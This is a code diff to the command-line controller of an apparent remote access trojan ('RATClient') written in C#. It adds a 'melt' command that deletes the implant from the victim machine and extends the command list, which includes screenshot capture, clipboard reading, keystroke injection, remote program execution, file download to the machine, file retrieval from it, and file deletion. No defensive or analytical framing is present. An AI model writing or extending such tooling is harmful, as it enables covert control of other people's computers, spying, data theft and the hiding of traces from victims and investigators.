@@ -72,6 +72,13 @@ namespace RATClient
                             EndConnection();
                             Environment.Exit(0);
                             break;
+                        case "melt":
+                            if (!ConnectCheck()) break;
+                            Console.WriteLine("Are You Sure You Want Delete The Server? This Cant Be Undone. Type \"Y\" To Confirm. Type \"N\" To Cancel.");
+                            string confirm = Console.ReadLine();
+                            if (confirm.ToLower() != "y") break;
+                            SendCommand(CMDS);
+                            break;
                     }
                 } else Console.WriteLine("Invalid Command.");
                 Console.WriteLine("");
@@ -151,7 +158,7 @@ namespace RATClient
         #region "Helper Methods"
         static bool ValidCommand(string CMD)
         {
-            Match m = Regex.Match(CMD, "^disconnect$|^info$|^processes$|^netstat$|^ipconfig$|^screenshot$|^logoff$|^shutdown$|^restart$|^clipboard$|^services$|^software$|^clear$|^help$|^exit$|^connect (?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$|^message .+$|^run .+$|^taskkill .+$|^ping .+$|^delete (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^sendkeys .+$|^retrieve (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^search (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^download (https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|www\\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9]+\\.[^\\s]{2,}|www\\.[a-zA-Z0-9]+\\.[^\\s]{2,}) (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^tree (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$", RegexOptions.IgnoreCase);
+            Match m = Regex.Match(CMD, "^disconnect$|^info$|^processes$|^netstat$|^melt$|^ipconfig$|^screenshot$|^logoff$|^shutdown$|^restart$|^clipboard$|^services$|^software$|^clear$|^help$|^exit$|^connect (?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$|^message .+$|^run .+$|^taskkill .+$|^ping .+$|^delete (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^sendkeys .+$|^retrieve (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^search (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^download (https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|www\\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9]+\\.[^\\s]{2,}|www\\.[a-zA-Z0-9]+\\.[^\\s]{2,}) (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^tree (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$", RegexOptions.IgnoreCase);
             return m.Success;
         }
         static void StartInfo()
@@ -173,23 +180,24 @@ namespace RATClient
             Console.WriteLine("HELP                     List Commands");
             Console.WriteLine("");
             Console.WriteLine("CLIPBOARD                Return ClipBoard Text If Present");          
-            Console.WriteLine("DELETE [path]            Delete A File On The Server");          
-            Console.WriteLine("DOWNLOAD [url] [path]    Download A File To The Server");           
-            Console.WriteLine("INFO                     List Server Information");
-            Console.WriteLine("IPCONFIG                 List Server Network Information");
-            Console.WriteLine("LOGOFF                   Log Off The Server");
-            Console.WriteLine("MESSAGE [message]        Send A Message To The Server");
-            Console.WriteLine("NETSTAT                  List Active Server Connections");
+            Console.WriteLine("DELETE [path]            Delete A File On The Computer");          
+            Console.WriteLine("DOWNLOAD [url] [path]    Download A File To The Computer");           
+            Console.WriteLine("INFO                     List Computer Information");
+            Console.WriteLine("IPCONFIG                 List Computer Network Information");
+            Console.WriteLine("LOGOFF                   Log Off The Computer");
+            Console.WriteLine("MELT                     Delete The Server");
+            Console.WriteLine("MESSAGE [message]        Send A Message To The Computer");
+            Console.WriteLine("NETSTAT                  List Active Computer Connections");
             Console.WriteLine("PING [target]            Ping Another Computer");
             Console.WriteLine("PROCESSES                List Running Processes");
-            Console.WriteLine("RESTART                  Restart The Server");
-            Console.WriteLine("RETRIEVE [path]          Download A File From The Server");
+            Console.WriteLine("RESTART                  Restart The Computer");
+            Console.WriteLine("RETRIEVE [path]          Download A File From The Computer");
             Console.WriteLine("RUN [path]               Run A Program");
-            Console.WriteLine("SCREENSHOT               Return A Screenshot From The Server");
+            Console.WriteLine("SCREENSHOT               Return A Screenshot From The Computer");
             Console.WriteLine("SEARCH [path]            List The Contents Of A Directory");
-            Console.WriteLine("SENDKEYS [keys]          Send Key Presses To The Server");
+            Console.WriteLine("SENDKEYS [keys]          Send Key Presses To The Computer");
             Console.WriteLine("SERVICES                 List Running Services");
-            Console.WriteLine("SHUTDOWN                 Shutdown The Server");
+            Console.WriteLine("SHUTDOWN                 Shutdown The Computer");
             Console.WriteLine("SOFTWARE                 List Installed Software");
             Console.WriteLine("TASKKILL [path]          Kill A Running Process");
             Console.WriteLine("TREE [path]              Return Folder Structure");
